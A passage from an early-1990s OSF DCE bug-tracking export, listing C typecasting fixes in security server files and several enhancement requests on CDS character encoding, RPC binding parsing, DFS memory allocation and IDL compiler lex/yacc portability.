            printf("%s Checkpoint on %s", rs_prod_name, ctime((long *)&tv.tv_sec));

  Line - 584
            printf("End %s Checkpoint on %s", rs_prod_name, ctime(&tv.tv_sec));
    should be:
            printf("End %s Checkpoint on %s", rs_prod_name, ctime((long *)&tv.tv_sec));

         ***************************************************

File:    security/server/rs/rs_log_acct.c
Problem: typecasting

  Line - 376
    login_name->pname[item->person_name_len] = NULL;
    should be:
    login_name->pname[item->person_name_len] = '\0';

  Line - 380
    login_name->gname[item->group_name_len] = NULL;
    should be:
    login_name->gname[item->group_name_len] = '\0';

  Line - 384
    login_name->oname[item->org_name_len] = NULL;
    should be:
    login_name->oname[item->org_name_len] = '\0';

         ***************************************************

File:    security/server/rs/rs_log_pgo.c
Problem: typecasting

  Line - 231
    pgo_name[pgo_log_item->name_len] = NULL;
    should be:
    pgo_name[pgo_log_item->name_len] = 0;

  Line - 235
   pgo_item->fullname[pgo_log_item->fullname_len] = NULL;
    should be:
   pgo_item->fullname[pgo_log_item->fullname_len] = 0;

  Line - 418
    name[log_info->name_len] = NULL;
    should be:
    name[log_info->name_len] = 0;

  Line - 585
    old_name[log_info->old_name_len] = NULL;
    should be:
    old_name[log_info->old_name_len] = 0;

  Line - 588
    new_name[log_info->new_name_len] = NULL;
    should be:
    new_name[log_info->new_name_len] = 0;

  Line - 620
    old_name[log_info->old_name_len] = NULL;
    should be:
    old_name[log_info->old_name_len] = 0;

  Line - 623
    new_name[log_info->new_name_len] = NULL;
    should be:
    new_name[log_info->new_name_len] = 0;

  Line - 735
    go_name[log_info->go_name_len] = NULL;
    should be:
    go_name[log_info->go_name_len] = 0;

  Line - 739
    person_name[log_info->person_name_len] = NULL;
    should be:
    person_name[log_info->person_name_len] = 0;

  Line - 767
    go_name[log_info->go_name_len] = NULL;
    should be:
    go_name[log_info->go_name_len] = 0;

  Line - 771
    person_name[log_info->person_name_len] = NULL;
    should be:
    person_name[log_info->person_name_len] = 0;

         ***************************************************

File:    security/server/rs/rs_log_policy.c
Problem: typecasting

  Line - 398
    org_name[log_info->name_len] = NULL;
    should be:
    org_name[log_info->name_len] = 0;

  Line - 485
    name[log_info->name_len] = NULL;
    should be:
    name[log_info->name_len] = 0;

         ***************************************************

File:    security/server/rs/rs_main.c
Problem: typecasting

  Line - 550
    *st = krb5_read_password("Enter password for locksmith account:",
                             "Reenter password to verify:",
                              passwd_str,
                              &passwd_str_len);
    should be:
    *st = krb5_read_password(
                "Enter password for locksmith account:",
                            "Reenter password to verify:",
                             passwd_str,
                             (int *)&passwd_str_len);

  Line - 635
            rsdb_unix_uuid_gen_check(sec_rgy_domain_person, true,
                                     &(pgo.unix_num), &(pgo.id), st);
    should be:
            rsdb_unix_uuid_gen_check(sec_rgy_domain_person,
             true, (int*)&(pgo.unix_num), &(pgo.id), st);

  Line - 658
            rsdb_unix_uuid_gen_check(sec_rgy_domain_group, true,
                                     &(pgo.unix_num), &(pgo.id), st);
    should be:
            rsdb_unix_uuid_gen_check(sec_rgy_domain_group,
             true, (int*)&(pgo.unix_num), &(pgo.id), st);

  Line - 679
            rsdb_unix_uuid_gen_check(sec_rgy_domain_org, true,
                                     &(pgo.unix_num), &(pgo.id), st);
    should be:
            rsdb_unix_uuid_gen_check(sec_rgy_domain_org,
             true, (int*)&(pgo.unix_num), &(pgo.id), st);

  Line - 1089
        if ( ! rs_task_join(task_handle, &result_p) ) {
    should be:
        if ( ! rs_task_join(task_handle,
               (void *)&result_p) ) {

         ***************************************************

File:    security/server/rs/rs_misc.c
Problem: typecasting

  Line - 86
    sec_acl_permset_t       parent_perms = NULL;
    should be:
    sec_acl_permset_t       parent_perms = (long)0;

         ***************************************************

File:    security/server/rs/rs_pgo.c
Problem: typecasting

  Line - 243
            rsdb_unix_uuid_check(&(pgo_item->unix_num), &(pgo_item->id), status);
    should be:
            rsdb_unix_uuid_check(
                              (int *)&(pgo_item->unix_num),
                              &(pgo_item->id), status);

  Line - 271
                    if(rsdb_unix_uuid_gen_check(name_domain, !is_cell,
                       &(pgo_item->unix_num), &(pgo_item->id), status)) {
    should be:
                    if(rsdb_unix_uuid_gen_check(name_domain, !is_cell,
                       (int *)&(pgo_item->unix_num),
                       &(pgo_item->id), status)) {

  Line - 394  and all such occurrences within the file
    sec_acl_permset_t       parent_perms = NULL;
    should be:
    sec_acl_permset_t       parent_perms = 0;

  Line - 794
    requested_perms = NULL;
    should be:
    requested_perms = 0;

         ***************************************************

File:    security/server/rs/rs_pwd.c
Problem: typecasting

  Line - 184
            sec_crypt_decrypt(ch, rpc_ss_allocate, rpc_ss_free, NULL,
                              transmit_rep->checksum->enc_pickle_len,
                              transmit_rep->checksum->enc_pickle,
                              (Pointer *)&sum_pkl, stp);
    should be:
            sec_crypt_decrypt(ch, (Pointer (*)
                                      (unsigned32 size)) rpc_ss_allocate,
                                  (void (*)
                                      (Pointer ptr)) rpc_ss_free,
                              NULL, transmit_rep->checksum->enc_pickle_len,
                              transmit_rep->checksum->enc_pickle,
                              (Pointer *)&sum_pkl, stp);

  Line - 195
                sec_crypt_decrypt(ch,  rpc_ss_allocate, rpc_ss_free, NULL,
                                  transmit_rep->key->enc_pickle_len,
                                  transmit_rep->key->enc_pickle,
                                  (Pointer *)&key_pkl, stp);
    should be:
                sec_crypt_decrypt(ch, (Pointer (*)
                                          (unsigned32 size)) rpc_ss_allocate,
                                      (void (*)
                                          (Pointer ptr)) rpc_ss_free,
                                  NULL, transmit_rep->key->enc_pickle_len,
                                  transmit_rep->key->enc_pickle,
                                  (Pointer *)&key_pkl, stp);

         ***************************************************

File:    security/server/rs/rs_reserved.c
Problem: typecasting

  Line - 512
            rsdb_unix_uuid_gen_check(pp->domain, pp->embedded_unix_id,
                                     &(pp->num), &(pgo_rec.id), st);
    should be:
            rsdb_unix_uuid_gen_check(pp->domain,
                           pp->embedded_unix_id,
                (int *)&(pp->num), &(pgo_rec.id), st);

  Line - 520
            rsdb_unix_uuid_gen_check(pp->domain, pp->embedded_unix_id,
                                     &(pp->num), &(pgo_rec.id), st);
    should be:
            rsdb_unix_uuid_gen_check(pp->domain,
                           pp->embedded_unix_id,
                 (int *)&(pp->num), &(pgo_rec.id), st);

  Line - 796
        if (*st_p = krb5_read_password(mkeyseed_prompt,
                                   0, password, &plen))
    should be:
        if (*st_p = krb5_read_password(mkeyseed_prompt,
                             0, password, (int*)&plen))

         ***************************************************

File:    security/server/rs/rs_secidmap.c
Problem: typecasting

  Line - 316, 524
    sec_acl_permset_t       parent_perms = NULL;
    should be:
    sec_acl_permset_t       parent_perms = 0;

  Line - 354, 554
            requested_perms = NULL;
    should be:
            requested_perms = 0;

         ***************************************************

File:    security/server/rs/rs_task.c
Problem: typecasting

  Line - 147
    result = pthread_create(task_handle, rs_task_attr,
                (void * /* pthread_startroutine_t */) task_fn,
    should be:
    result = pthread_create(task_handle, rs_task_attr,
                /* pthread_startroutine_t */ task_fn,

         ***************************************************

File:    security/server/rs/rwl.c
Problem: typecasting

  Line - 928
    if (debug_info != NULL && *debug_info != NULL) {
    should be:
    if (debug_info != NULL && *debug_info != '\0') {

  Line - 1080
    if (info_p->debug_info != NULL && *info_p->debug_info != NULL) {
    should be:
    if (info_p->debug_info != NULL &&
        *info_p->debug_info != '\0') {

         ***************************************************

[10/29/92 public]
The complaint about the "typedef enum" is wrong.  ANSI C allows an extra
trailing comma.
The complaint about localtime in sec_clientd.c is wrong; the
parameter to localtime is a (time_t *), not a (long *).
The complaint about ctime() in rsdb.c is wrong; ctime takes a
(time_t *), not a (long *).
The complaints about (int *) on some parameters should probably be
better fixed by making sure that the parameter is an int!

[10/29/92 public]

With respect to "typedef enum", I just checked the ANSI C spec, and Rich is
wrong, and Weidong Wang is correct.

See section 3.5.2.2, "Enumeration specifiers".  The syntax is defined as
(more or less):

enum-specifier:
	ENUM identifier_opt '{' enumerator-list '}'

enumerator-list:
	enumerator
	| enumerator-list ',' enumerator

There's no room for a spare comma at the end.

I seem to recall someone on comp.lang.c or comp.std.c flaming the ANSI
committee for not allowing this; Doug Gwyn's excuse was that they didn't
think they had implementation experience on this one like they did for
initializers.

[10/29/92 public]
Changed to an enhancement since this is not an issue for building
on the reference platform.



CR Number                     : 5840
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 3498,3497,3496
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cds/stubs/cds_clerkserver.idl
Short Description             : CDS - IDL -- NameFilter, ClassFilter  and ClassName defined as byte string (Category  : EBCDIC/ASCII Problems)
Reported Date                 : 10/28/92
Found in Baseline             : 1.0.1
Found Date                    : 10/28/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/28/92 public]

        ClassName, ClassFilter and  NameFilter in the enumerate
        and create operations ( eg. cds_EnumerateObjects,
        cds_EnumerateSoftLinks, cds_CreateObject etc)  are
        defined to be of type cds_Name_t which maps to a
        length field  followed by a  byte string.

        cds_Name_t defined in src/directory/cds/stubs/cds_types.idl
        file is given below for reference.

        typedef struct {
                  unsigned short int   nm_length;
                  byte                 nm_name[257];
        }  cds_Name_t;

     Examples :

     Scenario  1  -   CDS database created by an ASCII  Client
                      on the ASCII machine.  - Read these entries
                      from EBCDIC machine.

      Example :  NameFilter  problem

         If  an MVS Client sends an  enumerate object/softlink/child
         (matching a particular NameFilter)   request to a CDS server
         running on AIX then empty results are returned. This is
         because the CDS database is stored in ASCII on AIX and
         NameFilter string sent by the MVS Client is in EBCDIC.

     Scenario  2  -   CDS database created by an EBCDIC  Client
                      on the ASCII machine.     - Read these entries
                      from ASCII machine

      Example  : ClassName and ClassFilter Problem

          If  an EBCDIC Client  creates a  couple of object entries on
          an ASCII machine belonging to class say 'ABC',  then the
          CDS_CLASS attribute stored in  the these object entries
          will have the class name string 'ABC'  encoded in EBCDIC.
          The ASCII Client will not be able to enumerate these objects
          if he specifies the ClassFilter  'ABC'  because this string
          will be in the ASCII and match will fail.

Repeat By:

        Issue the following cdscp commands in the scenarios
        described above

         Scenario 1 :

            show object  /.:/XYZ*

        Scenario 2 :

         create object  /.:/obj1  CDS_Class = ABC CDS_ClassVersion = 1.0
         create object  /.:/obj2  CDS_Class = ABC CDS_ClassVersion = 1.0

         show   object  /.:/*   with  CDS_Class = ABC
               will show empty results

Proposed Solution:

    a)   Change the NameFilter, ClassFilter and ClassName data
         types to char string  (such as  cds_OpenChar_t defined in
         cds_types.idl) so that RPC  can perform the necessary
         ASCII<->EBCDIC conversions.



CR Number                     : 5809
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Auth-maybe calls supported inconsistently
Reported Date                 : 10/26/92
Found in Baseline             : 1.0.2
Found Date                    : 10/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/26/92 public]

In order for an authenticated maybe call to work, the server's
runtime must make an auth-way call back to the client.  If the
client is still around, and the authentication information is
still intact, this works fine.

However, if the client sends off the call and then exits, the
server's auth_way call will fail, and the maybe call will be
dropped.    This behavior is not consistent with the intended
meaning of the 'maybe' attribute.  That is, an application designed
in this way could be guaranteed that it would always fail.  (Note
that such an application would be quite reasonable w/o the use
of authentication; and that 'maybe' semantics and authentication
are orthogonal issues.)



CR Number                     : 5807
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : ubik
Short Description             : ubikclient.c should use osi_Alloc, not malloc
Reported Date                 : 10/26/92
Found in Baseline             : 1.0.2
Found Date                    : 10/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[10/26/92 public]
 While looking at the ubikclient.c file for OT 5800, I noticed it
calls malloc/free instead of osi_Alloc/osi_Free.  This will make it
harder to debug in the future; when someone makes a cleanup pass
through this code they should use the osi* versions.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/26/92 public]
Filled in Interest List CC with `comer@transarc.com' 
Changed Responsible Engr. from `comer@transarc.com' to `vijay@transarc.com'

[10/26/92 public]

[7/21/93 public]
Of course this is not the only place that uses malloc/free rather than
osi_Alloc/osi_Free. In fact, there are a bunch of them. We should do that in
one sweep. 
                                                                        
Mark this an enhancement. 
Here is the list that uses malloc/free not osi_Alloc/osi_Free:
afsd/afsd.c
bak/main.c
bakserver/db_text.c
bakserver/procs.c
bakutil/budb_test.c
bakutil/fms.c
bosserver/bossvr_main.c
butm/file_tm.c
dfsbind/bind_helper.c
dfsbind/main_helper.c
flserver/flserver.c
fsprobe/fsprobe.c
fsprobe/fsprobe_test.c
gtx/curseswindows.c
gtx/frame.c
gtx/keymap.c
gtx/lightobject.c
gtx/objects.c
gtx/textcb.c
gtx/textobject.c
icl/icl_dump.c
icl/icl_dumpCommand.c
ncscompat/compat_cds.c
ncscompat/compat_junct.c
ncscompat/compat_osi.c
ncscompat/compat_rpcVers.c
ncsubik/beacon.c
ncsubik/disk.c
ncsubik/lock.c
ncsubik/ubik.c
ncsubik/ubikclient.c
osi/osi_misc.c
osi/osi_pag.c
px/pxclient.c
scout/scout.c
security/dfssec_errorStrings.c
update/client.c
update/manager.c
update/server.c
util/ktime.c
util/malloc.c
xaggr/dfstab.c
xaggr/export.c
Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `comer@transarc.com' to `comer@transarc.com, 
 tu@transarc.com'

[7/21/93 public]
I can't believe it is worth the trouble to change all occurrences of malloc/free to
osi_Alloc/osi_Free.  Whoever ends up doing this please use some discretion.

[3/30/94 public]
We're looking at this for 1.1



CR Number                     : 5774
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp list dir
Short Description             : cdscp list dir /.:/non-existent-directory returns 0 status
Reported Date                 : 10/23/92
Found in Baseline             : 1.0.2
Found Date                    : 10/23/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/23/92 public]

The command "cdscp list dir /.:/non-existent-directory" returns a zero status
instead of a one and gives not error message.  This makes checking the cdscp
list dir return status useless in several CDS tests.  The "cdscp show dir
/.:/non-existent-directory" command correctly returns a one status and an
error message.

root@puddy(53) cdscp list dir /.:/wxyz
                        LIST
                   DIRECTORY   /.../admin_cell/wxyz
                          AT   1992-10-12-18:22:04
root@puddy(54) echo $status
0

root@puddy(51) cdscp show dir /.:/wxyz

                        SHOW
                   DIRECTORY   /.../admin_cell/wxyz
                          AT   1992-10-12-18:21:48
Error on entity: /.../admin_cell/wxyz
Requested entry does not exist (dce / cds)
Function: dnsEnumAttr
dnsEnumAttr: partial results = /.../admin_cell

root@puddy(52) echo $status
1

[10/23/92 public]
While I sympathize with Paul, we have been through this before. We explicitly
(and arguably incorrectly) made a decision in 1.0 to have cdscp return a 0
status for all commands except when it is unable to issue a CDS API call or
return the result. CDS requests that make it to the local clerk and back
cause a 0 exit status. I marked this as an enhancement because all commands
in addition to the one mentioned above exhibit this behavior. If OSF feels
strongly about this, let's talk about how to get this done as a 1.1 enhancement.

My vote, if we were to do this, would be to return a 0 if the call returned
a successful status, a 1 if the CDS status were unsuccessful, and a 2 if
a software or environmental error occurred.



CR Number                     : 5768
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : perf improvement for secd's construct_pac_from_local_name
Reported Date                 : 10/22/92
Found in Baseline             : 1.0.1
Found Date                    : 10/22/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/server/rs/rs_auth.c
Sensitivity                   : public

[10/22/92 public]

Iterative algorithm used by construct_pac_from_local_name to make sure
that enough buffer space is allocated to accept results returned by
rsdb_acct_get_projlist, could be replaced by at most two calls to
rsdb_acct_get_projlist since this routine return number of projects.



CR Number                     : 5764
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : dfs
Short Description             : remove unnecessary assert ..
Reported Date                 : 10/22/92
Found in Baseline             : 1.0.2
Found Date                    : 10/22/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[10/22/92 public]
Currently, there are quite a few osi_assert lines  left in the kernel code.
Most of them are for debugging purpose and should be removed when 
the product gets stable. 

This OT is used as a reminder. 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[10/22/92 public]
Since this is just a reminder, it should be an enhancment instead of a defect.
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 5745
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Add checks to secd RPC_DEBUG flag
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.1
Found Date                    : 10/21/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : src/security/server/rs/rs_main.c
Sensitivity                   : public

[10/21/92 public]

In the file rs_main.c there is a section of code:

        else if (match_command("-rpc_debug", argv[i], 3)) {
            if (++i == argc) {
                rpc__dbg_set_switches("0-4.3", st);
            } else {
                rpc__dbg_set_switches(argv[i], st);
            }
        }

There are two things wrong with the above code.  First, if the function
rpc__dbg_set_switches returns a failure status in st, there is no
check for it in the remainder of the code segment.

Second, there is no check to see if the next argument (argv[i]:) is
a valid rpc debug switch specification.

Repeat By:


Proposed Solution:

        Fix the parameter checking.

[10/21/92 public]
Assigned this to myself, downgraded it since there's nothing broken here,
it's just not doing robust argument checking...  This is an internal debugging
option that is only there for development and porting purposes.



CR Number                     : 5742
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Use a single debugging/tracing method in LFS
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.2
Found Date                    : 10/21/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[10/21/92 public]
The episode code base uses at least two different tracing/debugging methods,
neither of which is used in the DFS kernel code.  This enhancment is a result
of ot defect 3797 which was a bug caused by this mash of methods.
The current standard method is to use icl.  I believe that this work will 
wait until the 1.1 servicability changes.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/21/92 public]
If it will wait, we should mark it as such.
Changed Fix By Baseline from `1.0.2' to `1.1'

[11/16/92 public]
Reassigned to Ted.
Filled in Interest List CC with `bwl,mason' 
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 5738
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : rpc/runtime/combind.c
Short Description             : rpc_binding_from_string_binding return incorrect status for valid string
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.1
Found Date                    : 10/21/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/21/92 public]

        rpc_binding_from_string_binding returns the status 
	rpc_s_invalid_string_binding for the following string binding handles:

        ncacn_ip_tcp
        ncacn_ip_tcp[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp[2000]
        ncadg_ip_udp
        ncadg_ip_udp[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp[2000]

        The problem is in the rpc_string_binding_parse() routine in the same
        file (src/rpc/combind.c). The algorithm in that code always looks for
        ':'. If absent, it doesn't recognize the mandatory element of the
        string binding, the protocol sequence. The work around is to put ':'
        as shown below:

        ncacn_ip_tcp:
        ncacn_ip_tcp:[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp:
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp:[2000]
        ncadg_ip_udp:
        ncadg_ip_udp:[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp:
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp:[2000]

        which we do not feel is appropriate. DCE code can and should be cleaned
        to handle the cleaner format and yet allow old format if need be.

        Also the RPC Prog. Ref./AES should use BNF or some other notations to
        clearly state the syntax of the string binding. Please **avoid**
        substituting such notations by lengthy, yet unclear English 
	description.



CR Number                     : 5735
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/idl/idl_compiler/acf.h
Short Description             : Global Symbol Name Clash on LEX/YACC Functions and Variables
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.1
Found Date                    : 10/21/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/21/92 public]

        The current upgrade from AIX 3.15 to AIX 3.2 also saw the LEX
        library upgrade to a new version.  The new version of LEX
        supports multibyte characters.  Hence, there are new LEX
        variables and functions.  LEX is used for nidl.l and acf.l
        Global symbol names for functions and variables need to
        be remapped to other names so that there are no symbol
        clashes.  If these new additions to LEX are not remapped,
        it is impossible to port the IDL compiler to other
        platforms because the C compiler linker on other platforms
        may behave differently than the one found on AIX 3.2

Proposed Solution:

        src/rpc/idl/idl_compiler/acf.h currently contains the
        global symbol mapping for the previous version of LEX
        variables and functions.  The following new mappings are
        required.

        #define yymbcurmax       acf_yymbcurmax
        #define _once_yylex      acf_once_yylex
        #define yywinput         acf_yywinput
        #define yywunput         acf_yywunput
        #define yywreturn        acf_yywreturn
        #define yywoutput        acf_yywoutput
        #define yymbinput        acf_yymbinput
        #define yymboutput       acf_yymboutput
        #define yymbunput        acf_yymbunput
        #define yymbreturn       acf_yymbreturn
        #define yywtext          acf_yywtext
        #define yywleng          acf_yywleng
        #define yytbi            acf_yytbi
        #define yytbuf           acf_yytbuf
        #define yytwc            acf_yytwc
        #define yytbp            acf_yytbp
        #define yywbuf           acf_yywbuf

[10/21/92 public]
Perhaps a safer thing to do might be to run the lex output through
sed:
	sed -e 's/yy/acf_yy/g'

[10/21/92 public]
Not having been the author of the current scheme for dealing with yacc/lex
porting issue but having been the lucky winner who has ported it to several
platforms, I'd just like to put in the following plug:  There HAS to be a
better way.  All the #define's and #ifdef's are highly out of control in
this area.  Isn't there ANY way to abstract this stuff better so that
porting is easier and system dependencies minimized and isolated?

[12/8/92 public]

There needs to be significant cleanup of in lex/yacc code throughout IDL.
Additional problems arose during the port of DCE to OSF1.1.1 such that we
are currently using the OSF 1.0.4 lex to build DCE.  Setting to enhancement
for 1.1.

[6/2/93 public]

Following is the text of a document I wrote describing a rough outline of
how to make IDL much more portable.

======================================================================


Today the IDL compiler contains many dependencies on nonportable features
of yacc and lex.  These dependencies have caused many porting problems
for our customers.

There are fundamentally two problems.  Both problems are due to idl
referring to internal and unsupported yacc/lex data structures.  The goal
of this OT is to document the problems and propose solutions.  These
solutions will greatly increase idl's portability.
 

Problem 1: Multiple parsers in bound into one executable.
=========================================================

The problem:
============

Idl contains two grammars: one for IDL and one for ACF.  Each of these
grammars has its own yaccer and lexer.  yacc and lex are not designed to
handle this situation smoothly.  In the yacc/lex-generated C code, a number
of (invariantly named) external entrypoints and data objects are defined.
There are name clashes between the IDL and ACF parsers.

Today's solution to this problem is to rename the external names via
#defines in acf.h:

    #define yyact       acf_yyact
    #define yyback      acf_yyback
    #define yybgin      acf_yybgin
    #define yychar      acf_yychar
    #define yyparse     acf_yyparse
    ...

The problem with this model is that customer is responsible for cataloging
all the yacc/lex externally named objects and creating an acf.h.

Solution overview
=================

Modify the idl Makefile to use sed to rename the ambiguous names
(containing "yy") to be unique to the particular grammar.

acf_lex_yy_i.c:  acf.l
	${LEX} ${_LFLAGS_} -t ${.ALLSRC} > ${.TARGET}.tmp
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" ${.TARGET}.tmp > ${.TARGET}
	${RM} ${.TARGET}.tmp

acf_y_tab.c acf_y_tab.h: acf.y
	${YACC} ${_YFLAGS_} ${.ALLSRC}
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" y.tab.c > acf_y_tab.c
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" y.tab.h > acf_y_tab.h
	${RM} y.tab.c 
	${RM} y.tab.h 

lex_yy.c: nidl.l
	${LEX} ${_LFLAGS_} -t ${.ALLSRC} > ${.TARGET}.tmp
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" ${.TARGET}.tmp > ${.TARGET}
	${RM} ${.TARGET}.tmp

y_tab.c y_tab.h: nidl.y
	${YACC} ${_YFLAGS_} ${.ALLSRC}
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" y.tab.c > idl_y_tab.c
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" y.tab.h > idl_y_tab.h
	${RM} y.tab.c 
	${RM} y.tab.h

Several other small changes will be needed, such as changing references
from yyparse() to idl_yyparse().


Problem 2: Recursive calls to yyparse() during import operations
================================================================

The problem:
============

When processing import files, idl saves the entire state of the yacc/lex
world on a stack, recursively calls yyparse() [starting at the top of the
grammar], and pops the stack.  This would be fine, except that to
save/restore requires knowledge of many undocumented yacc/lex data
structures.  See idlparse.c for the nonportability details.

Here's what's done today:

	interface_body : ... optional_imports ... (grammar in nidl.y)
	optional_imports: ... import_file ...
	import_file:		{ FE_parse_import() }

	FE_parse_import():  (in frontend.c)

		SAVE_LEX_YACC_STATE ()
		save some idl-specific info
		setup to parse an import file

		parse() ->
			yyparse ()

		RESTORE_LEX_YACC_STATE ()
		restore some idl-specific info


The solution:
=============

The goal is to eliminate saving and restoring the yacc/lex state.  To do
this, we need to eliminate invoking yyparse() recursively.  The strategy is
to recognize an import statement beneath the lexer, i.e., in the input
stream handler.

Example:

	input idl file:		import a, b, c

	returned to lexer:	import a
				body of a
				import b
				body of b
				etc.


The yacc grammer must still see the actual "import" directive because
significant things (besides the input stream) change when going in/out of
an import file.  Consequently we make the input stream handler return an
"import" string to the lexer, and the lexer will return an IMPORT_KW to
yacc.

Here are the conceptual changes to nidl.y:

	import_file:
		STRING
		{
			int_p = FE_start_parsing_import ($<y_string>1);
		}

		interface       /* recurse back to top of grammar */

		{
			FE_done_parsing_import ()
		}


The changes to frontend.c are splitting FE_parse_import() into
FE_start_parsing_import() and FE_done_parsing_import().  Obviously we
discard the SAVE/RESTORE_LEX_YACC_STATE code.

Also the logic from parse() which manages ACF files needs to be broken out
into a new function so that FE_done_parsing_import() may process an import
file's ACF.

[09/03/93 public]
Setting status to defer, since we are going to address this in 1.1.
(See RPC 1.1 project plan)



CR Number                     : 5714
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : salvager should flip RO bit on fsets w/backing anodes
Reported Date                 : 10/20/92
Found in Baseline             : 1.0.1
Found Date                    : 10/20/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[10/20/92 public]
